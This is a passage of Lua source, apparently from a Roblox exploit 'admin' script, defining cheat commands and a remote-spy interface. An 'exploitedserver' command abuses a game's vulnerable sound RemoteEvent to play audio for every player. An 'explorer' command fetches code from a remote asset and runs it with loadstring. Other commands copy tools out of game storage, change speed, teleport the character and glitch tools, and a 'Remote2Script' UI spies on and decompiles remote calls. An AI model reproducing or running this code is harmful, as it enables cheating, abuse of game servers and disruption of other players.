table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= dankamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
for i = .2, 1 do
tool.Grip = CFrame.new(Vector3.new(math.sin(index * i), coolness, i)) * CFrame.Angles(math.sin(-index * i), index, i)
tool.Parent = LocalPlayer.Character
end
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = coolness
end)

addcmd('exploitedserver',{},
function(args, speaker)
for _,v in pairs (game:GetDescendants()) do
if v:IsA("RemoteEvent") then
if v.Name == "AC6_FE_Sounds" then
local remote = v
local ID = 174266954

local A_1 = "newSound"
local A_2 = "fuick"
local A_3 = game:GetService("Workspace")
local A_4 = "rbxassetid://"..ID
local A_5 = 0
local A_6 = 10
local A_7 = true
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5, A_6, A_7)

local A_1 = "playSound"
local A_2 = "fuick"
local Event = remote
Event:FireServer(A_1, A_2)

local A_1 = "updateSound"
local A_2 = "fuick"
local A_3 = "rbxassetid://"..ID
local A_4 = 1
local A_5 = 10
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5)

end
end
end
end)

addcmd('hipheight',{'hheight'},
function(args, speaker)
	if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
		Players.LocalPlayer.Character.Humanoid.HipHeight = args[1]
	end
end)

addcmd('dance',{},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local pchar=Players.LocalPlayer.Character
			local anim = nil		
			local dance1 = math.random(1,7)
			if dance1 == 1 then
			anim = '27789359'
			end
			if dance1 == 2 then
			anim = '30196114'
			end
			if dance1 == 3 then
			anim = '248263260'
			end
			if dance1 == 4 then
			anim = '45834924'
			end
			if dance1 == 5 then
			anim = '33796059'
			end
			if dance1 == 6 then
			anim = '28488254'
			end
			if dance1 == 7 then
			anim = '52155728'
			end
		local animation = Instance.new("Animation")
		animation.AnimationId = "rbxassetid://"..anim
		local animTrack = pchar.Humanoid:LoadAnimation(animation)
		animTrack:Play()
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)



addcmd('sit',{},
function(args, speaker)
	if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
		Players.LocalPlayer.Character.Humanoid.Sit = true
	end
end)

addcmd('spasm',{},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local pchar=Players.LocalPlayer.Character
		local AnimationId = "33796059"
		SpasmAnim = Instance.new("Animation")
		SpasmAnim.AnimationId = "rbxassetid://"..AnimationId
		Spasm = pchar.Humanoid:LoadAnimation(SpasmAnim)
		Spasm:Play()
		Spasm:AdjustSpeed(99)
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('unspasm',{'nospasm'},
function(args, speaker)
	Spasm:Stop()
	SpasmAnim:Destroy()
end)

addcmd('headthrow',{},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local AnimationId = "35154961"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..AnimationId
		local k = Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play(0)
		k:AdjustSpeed(1)
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('animation',{'anim'},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local pchar=Players.LocalPlayer.Character
		local AnimationId = tostring(args[1])
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..AnimationId
		local k = pchar.Humanoid:LoadAnimation(Anim)
		k:Play()
		if args[2] then
			k:AdjustSpeed(tostring(args[2]))
		end
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('ooftool',{},
function(args,speaker)
for i, v in pairs(game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool"):GetDescendants()) do
if v.ClassName == "Sound" then
v:Destroy()
end
end
wait()

game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
wait(0.4)

game.Players.LocalPlayer.Character.Humanoid.Parent = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
wait()

local h = Instance.new("Humanoid", game.Players.LocalPlayer.Character);h.Name = "NewHumanoid"
wait()


game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Backpack
wait()


for i = 1, 200 do
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
wait(0.04)
game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Backpack
wait(0.04)
end
end)

addcmd('tpposition',{'tppos'},
function(args,speaker)
	if #args < 3 then return end
	local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
	local char = Players.LocalPlayer.Character
	if char and char:FindFirstChild("HumanoidRootPart") then
		char.HumanoidRootPart.CFrame = CFrame.new(tpX,tpY,tpZ)
	end
end)

addcmd('offset',{},
function(args,speaker)
	if #args < 3 then return end
	local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
	local char = Players.LocalPlayer.Character
	if char and char:FindFirstChild("HumanoidRootPart") then
		char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(tpX,tpY,tpZ)
	end
end)

addcmd('getposition',{'getpos'},
function(args,speaker)
	local char = Players.LocalPlayer.Character
	if char and char:FindFirstChild("HumanoidRootPart") then
		local pos = tostring(char.HumanoidRootPart.Position)
		notify('Current Position',pos)
	end
end)

addcmd('speed',{'ws'},
function(args, speaker)
	if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
		Players.LocalPlayer.Character.Humanoid.WalkSpeed=tonumber(args[1])
	end
end)

addcmd('tools',{'gears'},
function(args, speaker)
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = Players.LocalPlayer.Backpack
			end
			copy(c)
		end
	end
	copy(game:GetService("Lighting"))
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
			c:Clone().Parent = Players.LocalPlayer.Backpack
			end
			copy(c)
		end
	end
	copy(game:GetService("ReplicatedStorage"))
	notify('Tools','Copied tools from ReplicatedStorage and Lighting')
end)

addcmd('keeptools',{'startertools','stools','ktools'},
function(args, speaker)
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = Players.LocalPlayer.StarterGear
			end
			copy(c)
        end
    end
    copy(Players.LocalPlayer.Backpack)
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = Players.LocalPlayer.StarterGear
			end
			copy(c)
		end
	end
	copy(Players.LocalPlayer.Character)
	notify('Tools','Copied tools to StarterGear')
end)

addcmd('nokeeptools',{'unkeeptools','nokeeptools','nostartertools','unstartertools','nostools','unstools','noktools','unktools'},
function(args, speaker)
	for i,c in pairs(Players.LocalPlayer.StarterGear:GetChildren())do
		if c:IsA('Tool') or c:IsA('HopperBin') then c:destroy()
		end
	end
	notify('Tools','Cleared tools from StarterGear')
end)

addcmd('notools',{'rtools','clrtools','removetools'},
function(args, speaker)
	for i,v in pairs(Players.LocalPlayer.Backpack:GetDescendants()) do
		if v:IsA('Tool') or v:IsA('HopperBin') then
			v:destroy()
		end
	end
	for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA('Tool') or v:IsA('HopperBin') then
			v:destroy()
		end
	end
	notify('Tools','Removed tools')
end)

addcmd('explorer',{'dex'},
function(args, speaker)
	local dex = loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
	game:GetService("CoreGui").Dex.PropertiesFrame.Changed:connect(function(property)
		if property == 'Position' then
			if game:GetService("CoreGui").Dex.PropertiesFrame.Position == UDim2.new(1, -300, 0.5, 36) then
				Notification:TweenPosition(UDim2.new(1, -800, 1, Notification.Position.Y.Offset), "InOut", "Quart", 0.5, true, nil)
				Holder:TweenPosition(UDim2.new(1, -550, 1, Holder.Position.Y.Offset), "InOut", "Quart", 0.2, true, nil)
				holderOffset = -550
				notifyOffset = -800
			elseif game:GetService("CoreGui").Dex.PropertiesFrame.Position == UDim2.new(1, 30, 0.5, 36) then
				Holder:TweenPosition(UDim2.new(1, -250, 1, Holder.Position.Y.Offset), "InOut", "Quart", 0.2, true, nil)
				Notification:TweenPosition(UDim2.new(1, -500, 1, Notification.Position.Y.Offset), "InOut", "Quart", 0.5, true, nil)
				holderOffset = -250
				notifyOffset = -500
			end
		end
	end)
end)

addcmd('remotespy',{'remotes'},
function(args, speaker)
	-- FrontEnd // UI

-- Objects

local RemoteSpy = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Ribbon = Instance.new("ImageLabel")
local Hide = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local Remotes = Instance.new("ScrollingFrame")
local Source = Instance.new("ScrollingFrame")
local ButtonsFrame = Instance.new("Frame")
local ToClipboard = Instance.new("TextButton")
local Decompile = Instance.new("TextButton")
local GetReturn = Instance.new("TextButton")
local ClearList = Instance.new("TextButton")
local CryptStrings = Instance.new("TextButton")
local EnableSpy = Instance.new("TextButton")
local Last = Instance.new("TextLabel")
local Total = Instance.new("TextLabel")
local Settings = Instance.new("TextButton")
local SetRemotes = Instance.new("ScrollingFrame")
local Storage = Instance.new("Frame")
local RBTN = Instance.new("TextButton")
local Icon = Instance.new("ImageLabel")
local RemoteName = Instance.new("TextLabel")
local ID = Instance.new("TextLabel")
local SBTN = Instance.new("TextButton")
local Icon_2 = Instance.new("ImageLabel")
local RemoteName_2 = Instance.new("TextLabel")
local ID_2 = Instance.new("TextLabel")
local ScriptLine = Instance.new("Frame")
local Line = Instance.new("TextLabel")
local SourceText = Instance.new("TextLabel")
local Tokens = Instance.new("TextLabel")
local Strings = Instance.new("TextLabel")
local Comments = Instance.new("TextLabel")
local Keywords = Instance.new("TextLabel")
local Globals = Instance.new("TextLabel")
local RemoteHighlight = Instance.new("TextLabel")
local Enabled = Instance.new("TextLabel")
local FullScreen = Instance.new("TextButton")
local SetRemotesTab = Instance.new("Frame")
local FilterF = Instance.new("TextButton")
local FilterE = Instance.new("TextButton")
local Search = Instance.new("TextBox")
local remotes_fired = 0
local encrypt_string = false
local spy_enabled = true

local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
local global_env = {"game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}

-- Properties

RemoteSpy.Name = "RemoteSpy"
RemoteSpy.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = RemoteSpy
BG.Active = true
BG.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.141176)
BG.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
BG.Draggable = true
BG.Position = UDim2.new(0.5, -700, 0.5, -400)
BG.Size = UDim2.new(1, -300, 1, -200)
BG.ClipsDescendants = true

Ribbon.Name = "Ribbon"
Ribbon.Parent = BG
Ribbon.BackgroundColor3 = Color3.new(0.760784, 0.0117647, 0.317647)
Ribbon.BorderSizePixel = 0
Ribbon.Size = UDim2.new(1, 0, 0, 20)
Ribbon.ZIndex = 2

Hide.Name = "Hide"
Hide.Parent = Ribbon
Hide.BackgroundColor3 = Color3.new(1, 0, 0)
Hide.BorderSizePixel = 0
Hide.Position = UDim2.new(1, -40, 0, 0)
Hide.Size = UDim2.new(0, 40, 0, 20)
Hide.ZIndex = 3
Hide.Font = Enum.Font.SourceSansBold
Hide.FontSize = Enum.FontSize.Size14
Hide.Text = "_"
Hide.TextColor3 = Color3.new(1, 1, 1)
Hide.TextSize = 14

Title.Name = "Title"
Title.Parent = Ribbon
Title.BackgroundColor3 = Color3.new(1, 0.0117647, 0.423529)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.5, -100, 0, 0)
Title.Size = UDim2.new(0, 200, 0, 20)
Title.ZIndex = 3
Title.Font = Enum.Font.SourceSansBold
Title.FontSize = Enum.FontSize.Size14
Title.Text = "Remote2Script v2"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 14

Remotes.Name = "Remotes"
Remotes.Parent = BG
Remotes.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Remotes.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
Remotes.Position = UDim2.new(0, 10, 0, 80)
Remotes.CanvasSize = UDim2.new(0, 0, 40, 0)
Remotes.Size = UDim2.new(0, 250, 1, -90)
Remotes.ZIndex = 2
Remotes.BottomImage = "rbxassetid://148970562"
Remotes.MidImage = "rbxassetid://148970562"
Remotes.ScrollBarThickness = 5
Remotes.TopImage = "rbxassetid://148970562"

Source.Name = "Source"
Source.Parent = BG
Source.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Source.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
Source.Position = UDim2.new(0, 270, 0, 80)
Source.Size = UDim2.new(1, -280, 1, -90)
Source.ZIndex = 2
Source.BottomImage = "rbxassetid://148970562"
Source.CanvasSize = UDim2.new(3, 0, 160, 0)
Source.MidImage = "rbxassetid://148970562"
Source.ScrollBarThickness = 5
Source.TopImage = "rbxassetid://148970562"

ButtonsFrame.Name = "ButtonsFrame"
ButtonsFrame.Parent = BG
ButtonsFrame.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
ButtonsFrame.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
ButtonsFrame.Position = UDim2.new(0, 10, 0, 30)
ButtonsFrame.Size = UDim2.new(1, -20, 0, 40)
ButtonsFrame.ZIndex = 2
ButtonsFrame.ClipsDescendants = true

ToClipboard.Name = "ToClipboard"
ToClipboard.Parent = ButtonsFrame
ToClipboard.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
ToClipboard.BorderColor3 = Color3.new(0.117647, 0.392157, 0.117647)
ToClipboard.Position = UDim2.new(0, 10, 0.5, -10)
ToClipboard.Size = UDim2.new(0, 100, 0, 20)
ToClipboard.ZIndex = 3
ToClipboard.Font = Enum.Font.SourceSansBold
ToClipboard.FontSize = Enum.FontSize.Size14
ToClipboard.Text = "COPY"
ToClipboard.TextColor3 = Color3.new(0.235294, 0.784314, 0.235294)
ToClipboard.TextSize = 14

Decompile.Name = "Decompile"
Decompile.Parent = ButtonsFrame
Decompile.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Decompile.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
Decompile.Position = UDim2.new(0, 120, 0.5, -10)
Decompile.Size = UDim2.new(0, 100, 0, 20)
Decompile.ZIndex = 3
Decompile.Font = Enum.Font.SourceSansBold
Decompile.FontSize = Enum.FontSize.Size14
Decompile.Text = "DECOMPILE"
Decompile.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Decompile.TextSize = 14

GetReturn.Name = "GetReturn"
GetReturn.Parent = ButtonsFrame
GetReturn.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
GetReturn.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
GetReturn.Position = UDim2.new(0, 230, 0.5, -10)
GetReturn.Size = UDim2.new(0, 100, 0, 20)
GetReturn.ZIndex = 3
GetReturn.Font = Enum.Font.SourceSansBold
GetReturn.FontSize = Enum.FontSize.Size14
GetReturn.Text = "GET RETURN"
GetReturn.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
GetReturn.TextSize = 14

ClearList.Name = "ClearList"
ClearList.Parent = ButtonsFrame
ClearList.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
ClearList.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
ClearList.Position = UDim2.new(0, 340, 0.5, -10)
ClearList.Size = UDim2.new(0, 100, 0, 20)
ClearList.ZIndex = 3
ClearList.Font = Enum.Font.SourceSansBold
ClearList.FontSize = Enum.FontSize.Size14
ClearList.Text = "CLEAR LOGS"
ClearList.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
ClearList.TextSize = 14

CryptStrings.Name = "CryptStrings"
CryptStrings.Parent = ButtonsFrame
CryptStrings.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
CryptStrings.BorderColor3 = Color3.new(0.392157, 0.117647, 0.117647)
CryptStrings.Position = UDim2.new(0, 450, 0.5, -10)
CryptStrings.Size = UDim2.new(0, 100, 0, 20)
CryptStrings.ZIndex = 3
CryptStrings.Font = Enum.Font.SourceSansBold
CryptStrings.FontSize = Enum.FontSize.Size14
CryptStrings.Text = "CRYPT STRINGS"
CryptStrings.TextColor3 = Color3.new(0.784314, 0.235294, 0.235294)
CryptStrings.TextSize = 14

EnableSpy.Name = "EnableSpy"
EnableSpy.Parent = ButtonsFrame
EnableSpy.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
EnableSpy.BorderColor3 = Color3.fromRGB(30, 100, 30)
EnableSpy.Position = UDim2.new(0, 560, 0.5, -10)
EnableSpy.Size = UDim2.new(0, 100, 0, 20)
EnableSpy.ZIndex = 3
EnableSpy.Font = Enum.Font.SourceSansBold
EnableSpy.FontSize = Enum.FontSize.Size14
EnableSpy.Text = "REMOTESPY"
EnableSpy.TextColor3 = Color3.fromRGB(60, 200, 60)
EnableSpy.TextSize = 14

Last.Name = "Last"
Last.Parent = ButtonsFrame
Last.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Last.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
Last.Position = UDim2.new(0, 670, 0.5, -10)
Last.Size = UDim2.new(0, 200, 0, 20)
Last.ZIndex = 3
Last.Font = Enum.Font.SourceSansBold
Last.FontSize = Enum.FontSize.Size14
Last.Text = ""
Last.TextColor3 = Color3.new(1, 1, 1)
Last.TextSize = 14
Last.TextWrapped = true

Total.Name = "Total"
Total.Parent = ButtonsFrame
Total.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Total.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
Total.Position = UDim2.new(0, 880, 0.5, -10)
Total.Size = UDim2.new(0, 50, 0, 20)
Total.ZIndex = 3
Total.Font = Enum.Font.SourceSansBold
Total.FontSize = Enum.FontSize.Size14
Total.Text = "0"
Total.TextColor3 = Color3.new(1, 1, 1)
Total.TextSize = 14
Total.TextWrapped = true

Settings.Name = "Settings"
Settings.Parent = ButtonsFrame
Settings.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Settings.BorderColor3 = Color3.new(0.117647, 0.392157, 0.392157)
Settings.Position = UDim2.new(1, -110, 0.5, -10)
Settings.Size = UDim2.new(0, 100, 0, 20)
Settings.ZIndex = 3
Settings.Font = Enum.Font.SourceSansBold
Settings.FontSize = Enum.FontSize.Size14
Settings.Text = "REMOTES"
Settings.TextColor3 = Color3.new(0.235294, 0.784314, 0.784314)
Settings.TextSize = 14

SetRemotes.Name = "SetRemotes"
SetRemotes.Parent = BG
SetRemotes.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
SetRemotes.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
SetRemotes.Position = UDim2.new(0, 270, 0, 80)
SetRemotes.Size = UDim2.new(1, -280, 1, -140)
SetRemotes.Visible = false
SetRemotes.ZIndex = 2
SetRemotes.BottomImage = "rbxassetid://148970562"
SetRemotes.CanvasSize = UDim2.new(0, 0, 25, 0)
SetRemotes.MidImage = "rbxassetid://148970562"
SetRemotes.ScrollBarThickness = 5
SetRemotes.TopImage = "rbxassetid://148970562"

Storage.Name = "Storage"
Storage.Parent = RemoteSpy
Storage.BackgroundColor3 = Color3.new(1, 1, 1)
Storage.Size = UDim2.new(0, 100, 0, 100)
Storage.Visible = false

RBTN.Name = "RBTN"
RBTN.Parent = Storage
RBTN.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
RBTN.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
RBTN.Position = UDim2.new(0, 10, 0, 10)
RBTN.Size = UDim2.new(1, -20, 0, 20)
RBTN.ZIndex = 3
RBTN.Font = Enum.Font.SourceSansBold
RBTN.FontSize = Enum.FontSize.Size14
RBTN.Text = ""
RBTN.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
RBTN.TextSize = 14
RBTN.TextXAlignment = Enum.TextXAlignment.Left

Icon.Name = "Icon"
Icon.Parent = RBTN
Icon.BackgroundColor3 = Color3.new(1, 1, 1)
Icon.BackgroundTransparency = 1
Icon.Size = UDim2.new(0, 20, 0, 20)
Icon.ZIndex = 4
Icon.Image = "rbxassetid://413369506"

RemoteName.Name = "RemoteName"
RemoteName.Parent = RBTN
RemoteName.BackgroundColor3 = Color3.new(0.713726, 0.00392157, 0.298039)
RemoteName.BorderSizePixel = 0
RemoteName.Position = UDim2.new(0, 30, 0, 0)
RemoteName.Size = UDim2.new(0, 140, 0, 20)
RemoteName.ZIndex = 4
RemoteName.Font = Enum.Font.SourceSansBold
RemoteName.FontSize = Enum.FontSize.Size14
RemoteName.Text = "10"
RemoteName.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
RemoteName.TextSize = 14

ID.Name = "ID"
ID.Parent = RBTN
ID.BackgroundColor3 = Color3.new(0.458824, 0.00392157, 0.192157)
ID.BorderSizePixel = 0
ID.Position = UDim2.new(1, -50, 0, 0)
ID.Size = UDim2.new(0, 50, 0, 20)
ID.ZIndex = 4
ID.Font = Enum.Font.SourceSansBold
ID.FontSize = Enum.FontSize.Size14
ID.Text = "10"
ID.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
ID.TextSize = 14

SBTN.Name = "SBTN"
SBTN.Parent = Storage
SBTN.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
SBTN.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
SBTN.Position = UDim2.new(0, 10, 0, 10)
SBTN.Size = UDim2.new(1, -20, 0, 20)
SBTN.ZIndex = 3
SBTN.Font = Enum.Font.SourceSansBold
SBTN.FontSize = Enum.FontSize.Size14
SBTN.Text = ""
SBTN.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
SBTN.TextSize = 11
SBTN.TextXAlignment = Enum.TextXAlignment.Left

Icon_2.Name = "Icon"
Icon_2.Parent = SBTN
Icon_2.BackgroundColor3 = Color3.new(1, 1, 1)
Icon_2.BackgroundTransparency = 1
Icon_2.Size = UDim2.new(0, 20, 0, 20)
Icon_2.ZIndex = 4
Icon_2.Image = "rbxassetid://413369506"

RemoteName_2.Name = "RemoteName"
RemoteName_2.Parent = SBTN
RemoteName_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
RemoteName_2.BorderSizePixel = 1
RemoteName_2.BorderColor3 = Color3.fromRGB(62, 62, 62)
RemoteName_2.Position = UDim2.new(0, 30, 0, 0)
RemoteName_2.Size = UDim2.new(0, 140, 0, 20)
RemoteName_2.ZIndex = 4
RemoteName_2.Font = Enum.Font.SourceSansBold
RemoteName_2.FontSize = Enum.FontSize.Size14
RemoteName_2.Text = "SayMessageRequest"
RemoteName_2.TextColor3 = Color3.fromRGB(200, 200, 200)
RemoteName_2.TextSize = 11

ID_2.Name = "ID"
ID_2.Parent = SBTN
ID_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ID_2.BorderSizePixel = 1
ID_2.BorderColor3 = Color3.fromRGB(62, 62, 62)
ID_2.Position = UDim2.new(1, -700, 0, 0)
ID_2.Size = UDim2.new(0, 700, 0, 20)
ID_2.ZIndex = 3
ID_2.Font = Enum.Font.SourceSansBold
ID_2.FontSize = Enum.FontSize.Size14
ID_2.Text = "10"
ID_2.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
ID_2.TextSize = 14

ScriptLine.Name = "ScriptLine"
ScriptLine.Parent = Storage
ScriptLine.BackgroundColor3 = Color3.new(1, 1, 1)
ScriptLine.BackgroundTransparency = 1
ScriptLine.Size = UDim2.new(1, 0, 0, 17)
ScriptLine.ZIndex = 2

Line.Name = "Line"
Line.Parent = ScriptLine
Line.BackgroundColor3 = Color3.new(0.329412, 0, 0)
Line.BackgroundTransparency = 1
Line.BorderSizePixel = 0
Line.Size = UDim2.new(0, 40, 1, 0)
Line.ZIndex = 3
Line.Font = Enum.Font.SourceSansBold
Line.FontSize = Enum.FontSize.Size18
Line.Text = ""
Line.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Line.TextSize = 17

SourceText.Name = "SourceText"
SourceText.Parent = ScriptLine
SourceText.BackgroundColor3 = Color3.new(1, 1, 1)
SourceText.BackgroundTransparency = 1
SourceText.Position = UDim2.new(0, 40, 0, 0)
SourceText.Size = UDim2.new(1, -40, 1, 0)
SourceText.ZIndex = 3
SourceText.Font = Enum.Font.Code
SourceText.FontSize = Enum.FontSize.Size18
SourceText.Text = ""
SourceText.TextColor3 = Color3.new(1, 1, 1)
SourceText.TextSize = 17
SourceText.TextXAlignment = Enum.TextXAlignment.Left

Tokens.Name = "Tokens"
Tokens.Parent = ScriptLine
Tokens.BackgroundColor3 = Color3.new(1, 1, 1)
Tokens.BackgroundTransparency = 1
Tokens.Position = UDim2.new(0, 40, 0, 0)
Tokens.Size = UDim2.new(1, -40, 1, 0)
Tokens.ZIndex = 3
Tokens.Font = Enum.Font.Code
Tokens.FontSize = Enum.FontSize.Size18
Tokens.Text = ""
Tokens.TextColor3 = Color3.new(0.392157, 0.392157, 0.392157)
Tokens.TextSize = 17
Tokens.TextXAlignment = Enum.TextXAlignment.Left

Strings.Name = "Strings"
Strings.Parent = ScriptLine
Strings.BackgroundColor3 = Color3.new(1, 1, 1)
Strings.BackgroundTransparency = 1
Strings.Position = UDim2.new(0, 40, 0, 0)
Strings.Size = UDim2.new(1, -40, 1, 0)
Strings.ZIndex = 5
Strings.Font = Enum.Font.Code
Strings.FontSize = Enum.FontSize.Size18
Strings.Text = ""
Strings.TextColor3 = Color3.new(1, 0.615686, 0)
Strings.TextSize = 17
Strings.TextXAlignment = Enum.TextXAlignment.Left

Comments.Name = "Comments"
Comments.Parent = ScriptLine
Comments.BackgroundColor3 = Color3.new(1, 1, 1)
Comments.BackgroundTransparency = 1
Comments.Position = UDim2.new(0, 40, 0, 0)
Comments.Size = UDim2.new(1, -40, 1, 0)
Comments.ZIndex = 5
Comments.Font = Enum.Font.Code
Comments.FontSize = Enum.FontSize.Size18
Comments.Text = ""
Comments.TextColor3 = Color3.fromRGB(60, 200, 60)
Comments.TextSize = 17
Comments.TextXAlignment = Enum.TextXAlignment.Left

RemoteHighlight.Name = "RemoteHighlight"
RemoteHighlight.Parent = ScriptLine
RemoteHighlight.BackgroundColor3 = Color3.new(1, 1, 1)
RemoteHighlight.BackgroundTransparency = 1
RemoteHighlight.Position = UDim2.new(0, 40, 0, 0)
RemoteHighlight.Size = UDim2.new(1, -40, 1, 0)
RemoteHighlight.ZIndex = 3
RemoteHighlight.Font = Enum.Font.Code
RemoteHighlight.FontSize = Enum.FontSize.Size18
RemoteHighlight.Text = ""
RemoteHighlight.TextColor3 = Color3.fromRGB(0, 145, 255)
RemoteHighlight.TextSize = 17
RemoteHighlight.TextXAlignment = Enum.TextXAlignment.Left

Keywords.Name = "Keywords"
Keywords.Parent = ScriptLine
Keywords.BackgroundColor3 = Color3.new(1, 1, 1)
Keywords.BackgroundTransparency = 1
Keywords.Position = UDim2.new(0, 40, 0, 0)
Keywords.Size = UDim2.new(1, -40, 1, 0)
Keywords.ZIndex = 3
Keywords.Font = Enum.Font.Code
Keywords.FontSize = Enum.FontSize.Size18
Keywords.Text = ""
Keywords.TextColor3 = Color3.new(0.231373, 1, 0)
Keywords.TextSize = 17
Keywords.TextXAlignment = Enum.TextXAlignment.Left

Globals.Name = "Globals"
Globals.Parent = ScriptLine
Globals.BackgroundColor3 = Color3.new(1, 1, 1)
Globals.BackgroundTransparency = 1
Globals.Position = UDim2.new(0, 40, 0, 0)
Globals.Size = UDim2.new(1, -40, 1, 0)
Globals.ZIndex = 3
Globals.Font = Enum.Font.Code
Globals.FontSize = Enum.FontSize.Size18
Globals.Text = ""
Globals.TextColor3 = Color3.new(1, 0, 0)
